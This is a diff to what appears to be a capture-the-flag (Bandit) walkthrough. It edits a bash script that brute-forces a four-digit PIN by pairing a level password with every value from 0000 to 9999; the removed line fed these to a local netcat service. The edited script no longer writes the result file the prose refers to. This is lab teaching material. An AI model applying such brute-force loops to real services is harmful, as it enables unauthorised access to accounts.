@@ -335,10 +335,8 @@ Now, lets create a script `nano bruteforce.sh`. Inside the script lets add:
 #!/bin/bash 
 for i in {0000..9999}
 do 
-`echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> pass.txt   
+        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"   
 done
-
-cat pass.txt | nc localhost 30002 > result.txt
 ~~~~
 Lets change the permissions with `chmod 777 bruteforce.sh`. Run the script and you'll get the password for the next level sent to the `result.txt`.
 For this you can use `grep bandit25 result.txt` 
